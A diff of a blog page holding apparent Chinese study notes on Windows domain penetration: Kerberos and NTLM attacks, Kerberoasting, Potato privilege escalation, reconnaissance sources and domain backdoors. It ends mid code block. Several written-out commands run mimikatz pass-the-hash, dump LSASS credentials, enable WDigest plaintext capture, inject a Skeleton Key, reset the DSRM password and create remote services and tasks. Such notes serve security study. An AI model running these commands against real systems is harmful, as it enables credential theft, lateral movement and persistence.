@@ -44,6 +44,8 @@
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912110205311.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105158564.png">
+<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230028258.png">
+<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230052008.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VpEBbVXlVoCXg4xyKjqclkTynhe.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VRxLbPbLboDpcKxJHhsc1fvInzh.png">
@@ -61,7 +63,7 @@
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Hn54bBGLRoNU3Ex2c6hcyE4lnkf.png">
 <meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NFb1b7l4goaJW0xWReBcBvuXnSf.png">
 <meta property="article:published_time" content="2024-06-27T14:59:49.000Z">
-<meta property="article:modified_time" content="2024-09-12T03:25:33.094Z">
+<meta property="article:modified_time" content="2024-11-21T01:19:52.921Z">
 <meta property="article:author" content="z2zQAQ">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png">
@@ -263,7 +265,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          25k 字
+          26k 字
         
       </span>
     
@@ -274,7 +276,7 @@
         
         
         
-          206 分钟
+          218 分钟
         
       </span>
     
@@ -316,7 +318,12 @@
             
               <div class="markdown-body">
                 
-                <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png" srcset="/img/loading.gif" lazyload alt="image-20240819104453066"></p>
+                <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>安全选项中的“以管理员批准模式运行所有管理员”</p>
+<p>LocalAccountTokenFilterPolicy</p>
+<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>Administrator和本地管理员都属于administrator组,但是由于UAC,本地管理员部分命令需要使用“以管理员身份运行”</p>
+<p>System权限大于Administrator，部分注册表需要System</p>
+<p>本地无法查询组信息的时候可以用Incognito获取System</p>
+<h2 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png" srcset="/img/loading.gif" lazyload alt="image-20240819104453066"></p>
 <p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240817201648187.png" srcset="/img/loading.gif" lazyload alt="image-20240817201648187"></p>
 <p>Ntds.dit：域控下才有，包含域用户，组合组成员，凭据，gpp，被注册表下的密钥对加密的用户hash（破解需要导出system.hive文件）等信息，位于%SystemRoot%\ntds\ntds.di</p>
 <p>sam：工作组环境中存储用户密码</p>
@@ -332,7 +339,18 @@
 <h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>结构 username:RID:LM-HASH:NTLM-HASH:LM Hash:DES，</p>
 <p>如果要停止使用 LM Hash,<strong>将用户的密码设置为 14 位以内，</strong> “ab35454a3435451404046” (表示 LMHash 为空值或被禁用)。</p>
 <p>2008 开始默认禁用，个人版从 Windows Vista 以后，服务器版从 Wndows Sever 2003 后使用 NTLM Hash</p>
-<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h4 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h4><p>当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份,验证通过后 AS 会发放的一个 TGT,随后 Client 再次向 TGS 证明自己的身份,验证通过后 TGS 会发放一个 ST,最后 Client 向 Server 发起认证请求,这个过程分为三块：<br><strong>Client 与 AS 的交互,</strong><br><strong>Client 与 TGS 的交互,</strong><br><strong>Client 与 Server 的交互。</strong><br><strong>黄金票据是伪造 TGT，白银票据则是伪造 ST</strong></p>
+<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>将服务实例和服务登录账号关联起来，</p>
+<h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h3><p>WindowsServer 2012 R2</p>
+<p>建立了ProtectedUsers组，强制使用kerberos验证，引出了PTK，但是该补丁并不限制域内用户，一般只在域内无法PTH的时候考虑</p>
+<h3 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h3><p><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/06/28/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%9C%E7%94%A8">内网渗透之kerberos协议学习及攻击方法总结 · HacKerQWQ’s Studio</a></p>
+<p>（走kerberos协议的时候必须通过域名去连接）</p>
+<p>对于域内账户</p>
+<p>1.当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份（Clinet hash加密的时间戳），验证通过后 AS 会发放一个 （krbtgt hash加密）的TGT</p>
+<p>2.随后 Client 再次向 TGS 证明自己的身份（解密TGT验证），验证通过后获得 TGS （也就有了ST）</p>
+<p>3.最后Client用TGS去请求服务，解密成功时服务得到PAC，发送到KDC检查Client是否有相应权限</p>
+<p>这个过程分为三块：<br><strong>Client 与 AS 的交互,</strong></p>
+<p><strong>Client 与 TGS 的交互,</strong></p>
+<p><strong>Client 与 Server 的交互。</strong><br><strong>黄金票据是伪造 TGT，白银票据则是伪造 ST</strong></p>
 <p><strong>一个获得通用的身份，一个获得访问服务的权限</strong></p>
 <p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/TnjRbqFw6obmhJx2CbZc7irynwe.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
 <h3 id="LocalAccountTokenFilterPolicy"><a href="#LocalAccountTokenFilterPolicy" class="headerlink" title="LocalAccountTokenFilterPolicy"></a>LocalAccountTokenFilterPolicy</h3><p>组环境下，<code>Windows Vista</code>以后的操作系统中，注册表中默认没有这个值，当administrator之外的用户连接护得到删除管理员凭证的令牌导致无法连接</p>
@@ -382,14 +400,29 @@
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span>段：可以通过在线网站记录或者暴力扫描<br>旁站：同一服务器但是不同站点，需要定位资产，在线网站查询<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>绕过CDN查真实ip</p>
-</li>
-<li><p>网站架构：服务器版本，中间件，框架</p>
+<p>首先cc.chinaz查CDN供应商</p>
+<p>然后历史记录，多地区ping等绕过</p>
 </li>
 <li><p>二级域名</p>
+<p>爆破，dns解析…</p>
 </li>
-<li><p>waf</p>
+<li><p>数字证书</p>
+<p>crt.sh</p>
 </li>
-<li><p>数据库版本</p>
+<li><p>商业信息：企查查..</p>
+</li>
+<li><p>社交媒体，用户名，邮件收集..</p>
+<p>rocketreach</p>
+<p>sherlock，maigre，whatsmyname.app</p>
+<p>hunter.io，phoneboock.cz，omail.io，skymem.info</p>
+</li>
+<li><p>源码查询</p>
+<p>gitdocker，searchcode</p>
+</li>
+<li><p>密码泄露</p>
+<p>intelx.io(文件),cirt.net，default-password.info,routerpasswords(设备)，</p>
+</li>
+<li><p>网站架构：服务器版本，中间件，框架，数据库版本，waf</p>
 </li>
 </ul>
 <h2 id="判断靶标系统"><a href="#判断靶标系统" class="headerlink" title="判断靶标系统"></a>判断靶标系统</h2><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>windows 不敏感</p>
@@ -457,32 +490,36 @@
 <h2 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h2><p>135：rpc协议（远程过程调用）支持wmi（windwos管理接口）</p>
 <p> <code>wmic /node:172.18.2.44 /user:&quot;user&quot; /password:&quot;pass&quot; process call create &quot;cmd.exe /c whoami“</code></p>
 <p>日志少，配合wmihacker等工具</p>
-<p>445：ipc共享</p>
+<p>139&#x2F;445：SMB协议：开启ipc$共享</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（基础连接）net use \\IP\ipc$ /u:<span class="hljs-string">&quot;username&quot;</span> password<br><br>（远程服务）sc \\172.18.2.44 create xxx binpath= “cmd.exe /c c:\1.bat” <br><br>（远程计划任务）: schtasks /create /tn <span class="hljs-built_in">test</span> /tr calc.exe /sc /s 192.168.120.150 /u administrator /p <span class="hljs-built_in">test</span> /ru system<br></code></pre></td></tr></table></figure>
 
 <p>直接配合psexec，atexec，smbexec</p>
 <p>atexec：明文密码或hash，计划任务</p>
-<p>psexec：admin$共享，写文件</p>
+<p>psexec：admin$共享，写文件执行服务</p>
+<p>psexec.py: 同上 可交互</p>
 <p>smbexec：明文密码或hash，服务</p>
 <p>5985：WinRM（windwos远程管理）协议</p>
 <p><code>winrs -r:172.18.2.44 -u:localhost\administrator -p:p@ssw0rd ipconfig</code></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14060?time__1311=GqAxuDRD0iq4lEzG7DyGQwfuC0Wx">内网横向下的135,445与5985端口利用 - 先知社区 (aliyun.com)</a></p>
-<p>其中 wmiexec，crackmapExec同时利用了135和445与admin$共享，他们通过smb回传结果</p>
+<p>其中dcomexec, wmiexec，crackmapExec同时利用了135和445与admin$共享，他们通过smb回传结果</p>
 <h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>利用 AS-REQ 包错误代码</p>
 <p>kerbrute msf(kerberos_enumusers)</p>
 <h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>获得密码后攻击不同用户</p>
 <p>CrackMapExec kerbrute msf（smb_login）</p>
 <p>防护：事件 ID 为 4768 且结果代码为 0x0 的审核成功的 Kerberos 身份验证服务事件日志</p>
-<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>没开启 kerberos 预身份验证，向域控 88 端口请求票据(rubeus ASPERoast.ps1 Adfind)后本地离线爆破（john hashcat）</p>
+<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>关闭 <strong>kerberos 预身份验证</strong>，</p>
+<p>向域控 88 端口请求票据(<strong>GetNPUsers</strong> rubeus ASPERoast.ps1 Adfind)</p>
+<p>本地离线爆破（john hashcat）</p>
 <p>防护：</p>
 <ul>
 <li>取消勾选“不要求 kerberos 预身份认证”选项</li>
 <li>重点关注事件 ID 为 4768 且预身份验证为 0 的日志</li>
 </ul>
 <h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h2><p>获取 ST 后爆破 hash</p>
-<p>普通默认机器可以注册 spn，但是普通域用户需要权限，攻击需要域内用户，所有用户都可以查询 spn</p>
-<p>1.获取 SPN(ServicePrincipal Names)服务主体名称（RiskySPN GetUserSPNs PowerView setspn）</p>
-<p>2.请求服务票据(impacket.GetUserSPNs,Rubeus,POWERSHELL)</p>
+<p>普通默认机器可以注册 <strong>spn</strong>，但是普通域用户需要权限，攻击需要域内用户，所有用户都可以查询 spn</p>
+<p>服务实例（SPN）会绑定用户，<strong>攻击者拿到服务实例NTLM hash加密的ST，然后ST爆破得到用户的密码</strong></p>
+<p>1.获取 SPN(ServicePrincipal Names)服务主体名称（RiskySPN <strong>GetUserSPNs</strong> PowerView setspn）</p>
+<p>2.请求服务票据(impacket.<strong>GetUserSPNs</strong>,<strong>Rubeus</strong>,POWERSHELL)</p>
 <p>3.导出(cmd.Klist,kerbero,mimikatz,Empire)</p>
 <p>4.破解(kerberoast hashcat)</p>
 <p>防护：</p>
@@ -495,6 +532,8 @@
 <p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p>
 <p>委派：将域内用户账户的权限给予服务账户</p>
 <p>查询：Powershgell 脚本，Adfind，Ldapsearch</p>
+<p>非约束委派：<strong>userAccountControl</strong>属性会包含<strong>TRUSTED_FOR_DELEGATION</strong></p>
+<p>可以配合spooler漏洞，利用MS-RPRN强制运行域控通过kerberos去连接开启了非约束委派的机器</p>
 <h2 id="NTLM-RELAY（嗅探）"><a href="#NTLM-RELAY（嗅探）" class="headerlink" title="NTLM RELAY（嗅探）"></a>NTLM RELAY（嗅探）</h2><p>responder 嗅探流量</p>
 <p>受害机器查询不存在的主机名称后抓到 hash</p>
 <p>配合 srf 文件</p>
@@ -523,7 +562,8 @@
 <p>创建计划任务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">创建 schtasks /create /s ip /tn 计划名/sc onstart /tr c:\dayu.txt /ru system /f<br>运行 schtasks /run /s ip /i /tn <span class="hljs-string">&quot;计划名&quot;</span><br>指定ipc账号 /u /p <br>删除 schtasks /delete /s ip /tn <span class="hljs-string">&quot;计划名&quot;</span> -f<br>痕迹清理 net use 名称 /del /y<br></code></pre></td></tr></table></figure>
 
-<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>hash 传递到其他机子上，通过 445（SMB 文件共享端口）和 135 端口(RPC 服务共享)横向</p>
+<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>windows servers 2012 R2之后，系统默认安装KB2871997,本地管理员组中只有administrator可以传递（FilterAdministratorToken注册表为0）</p>
+<p>hash 传递到其他机子上，通过 445（SMB 文件共享端口）和 135 端口(RPC 服务共享)横向</p>
 <p>CrackMapExec,MSF(SMB&#x2F;PSEXEC),impacket-smbexec</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">目标机器上：sekurlsa:<span class="hljs-function">:pth</span> <span class="hljs-string">/user</span><span class="hljs-function">:administrator</span> <span class="hljs-string">/domain</span>:<span class="hljs-string">&quot;xxx.com&quot;</span> <span class="hljs-string">/ntlm</span><span class="hljs-function">:6542d35ed5ff6ae5e75b875068c5d3bc</span>  <span class="hljs-string">//</span>自行修改<br>net use \\ip\c$<br></code></pre></td></tr></table></figure>
 
@@ -544,15 +584,11 @@
 <p>mimikatz</p>
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.DMP    <span class="hljs-meta">#看到Switch to MINIDUMP 加载成功</span><br><span class="hljs-symbol">sekurlsa:</span>:logonPasswords full    <span class="hljs-meta">#导出密码散列值</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="Wdigest-明文抓取"><a href="#Wdigest-明文抓取" class="headerlink" title="Wdigest 明文抓取"></a>Wdigest 明文抓取</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
+<h4 id="Wdigest-明文抓取"><a href="#Wdigest-明文抓取" class="headerlink" title="Wdigest 明文抓取"></a>Wdigest 明文抓取</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="hljs-comment">#关闭</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>
 
 <p>调整为 1 后重启即可查看明文密码（权限维持可用）</p>
-<h2 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h2><p>Hashcat 爆破</p>
-<p>在线破解</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.objectif-securite.ch<span class="hljs-regexp">/en/</span>ophcrack<br>https:<span class="hljs-regexp">//</span>www.cmd5.com/<br>http:<span class="hljs-regexp">//</span>www.xmd5.com/<br></code></pre></td></tr></table></figure>
-
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
 <p>在 Kerberos 认证中，Client 通过 AS（身份认证服务）认证后，AS 会给 Client 一个 Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后，就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p>
 </blockquote>
 <h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
@@ -582,6 +618,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/domain：域名<br>/sid：域的SID值<br>/target: 域控制器全称即FQDN<br>/service: 需要指定相关的服务名，此处为cifs<br>/rc4: 域控的计算机账户ntlm <span class="hljs-built_in">hash</span><br>/user: 要伪造的用户名，任意填写<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PdHnbjpPXoIfJDxA4cqc5Gc2nig.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
+<p>由于白银票据不与KDC交互，并不要求dns远程解析，socks环境下黄金票据无法远程dns解析会导致NTLM认证失败</p>
 <h2 id="RDP-协议"><a href="#RDP-协议" class="headerlink" title="RDP 协议"></a>RDP 协议</h2><p>① 查询注册表确定是否主机开启了远程桌面</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections <br><span class="hljs-attribute">ps</span>: 若字段值为<span class="hljs-number">0</span>，则表示已启动RDP；若为<span class="hljs-number">1</span>，则表示禁用RDP<br></code></pre></td></tr></table></figure>
 
@@ -678,7 +715,17 @@
 <p>例如会自动执行&#x2F;usr&#x2F;loca&#x2F;bin&#x2F;aaa.sh</p>
 <p>但是可以创建一个&#x2F;home&#x2F;user&#x2F;aaa.sh劫持</p>
 <h3 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h3><h3 id="Passwd-shadow-提权"><a href="#Passwd-shadow-提权" class="headerlink" title="Passwd&#x2F;shadow 提权"></a>Passwd&#x2F;shadow 提权</h3><p>shadow 解密或者手动生成 passwd&#x2F;shadow 密文</p>
-<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><h2 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a><strong>windows</strong></h2><h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><p>通过 Webshell 命令行执行 systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果 cmd 无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</p>
+<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><h2 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a><strong>windows</strong></h2><h3 id="POTATO"><a href="#POTATO" class="headerlink" title="POTATO"></a>POTATO</h3><p>核心是利用COM类，捕获并修改NTLM认证数据包</p>
+<p>需求</p>
+<ol>
+<li>获取到高权限的 token</li>
+<li>当前账户拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</li>
+</ol>
+<p>一般是给到本地管理员和本地服务账户，两个权限的本意是让高权限服务模拟低权限客户端来操作</p>
+<h4 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h4><p>LLMNR&#x2F;NBNS投毒</p>
+<h4 id="Rotten-Juicy"><a href="#Rotten-Juicy" class="headerlink" title="Rotten &amp; Juicy"></a>Rotten &amp; Juicy</h4><p>通过DCOM call让服务向攻击者监听端口发放NTLM认证，拿到NTLM后启动新进程</p>
+<h4 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h4><p>利用了spoolsv.exe服务的RPC服务中传递\\127.0.0.1&#x2F;pipe&#x2F;foo会解析为主机名后链接</p>
+<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><h4 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h4><h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><p>通过 Webshell 命令行执行 systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果 cmd 无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#手工查找补丁情况</span><br>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><br><span class="hljs-comment">#MSF后渗透扫描</span><br>post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br>post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br><br><span class="hljs-comment">#windows exploit suggester</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AonCyberLabs/</span>Windows-Exploit-Suggester<br><br><span class="hljs-comment">#powershell中的sherlock脚本</span><br>Import-Module C:\Sherlock.ps1 <span class="hljs-comment">#下载ps1脚本，导入模块</span><br>Find-AllVulns<br><br><span class="hljs-comment">#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>usemodule privesc<span class="hljs-regexp">/powerup/</span>allchecks<br>execute<br><br>其他工具<br>WES-NG<br>Sherlock<br></code></pre></td></tr></table></figure>
 
 <p>exp 在线查询</p>
@@ -701,6 +748,7 @@
 
 <h3 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h3><blockquote>
 <p>管理员凭证配置错误<br>服务配置错误<br>故意削弱的安全措施<br>用户权限过高</p>
+<p>不带引号的服务路径</p>
 </blockquote>
 <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 存储Windows服务有关的信息 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\CurrentControlSet\Services <br><span class="hljs-comment"># 服务对应的程序路径存储 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\ControlSet001\Services\Vulnerable Service\服务名\ImagePath <br><span class="hljs-comment"># AlwaysInstallElevated  允许低权限用户以最高权限安装MSI文件</span><br></code></pre></td></tr></table></figure>
 
@@ -727,13 +775,20 @@
 <h2 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h2><blockquote>
 <p>替换系统文件类(shift 后门,放大镜后门)<br>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL<br>文件类<br>自启动文件夹、office Word StartUp 劫持<br>计划任务<br>schtasks 、WMI、bitsadmin</p>
 </blockquote>
-<h1 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/359329.html">常见域后门技术总结与分析利用 - FreeBuf网络安全行业门户</a></p>
-<h2 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h2><p>注入lsass.exe进程实现‘万能密码’，重启后失效</p>
+<h2 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/359329.html">常见域后门技术总结与分析利用 - FreeBuf网络安全行业门户</a></p>
+<h3 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h3><p>注入lsass.exe进程实现‘万能密码’，重启后失效</p>
 <p>mimikatz.exe “privilege::debug” “misc::skeleton” exit # 密码为 mimikatz</p>
-<h2 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h2><p>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码</p>
+<h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Bash">ntdsutil <span class="hljs-comment"># 进入 ntdsutil</span><br><span class="hljs-built_in">set</span> dsrm password <span class="hljs-comment"># 进入设置 DSRM 账户密码设置模式</span><br>reset password on server null <span class="hljs-comment"># 在当前域控上恢复 DSRM 密码</span><br>&lt;password&gt;  <span class="hljs-comment"># 输入新密码 123456Lhz！</span><br>&lt;password&gt;  <span class="hljs-comment"># 再次输入新密码</span><br>q <span class="hljs-comment"># 退出 DSRM 密码设置模式</span><br>q <span class="hljs-comment"># 退出 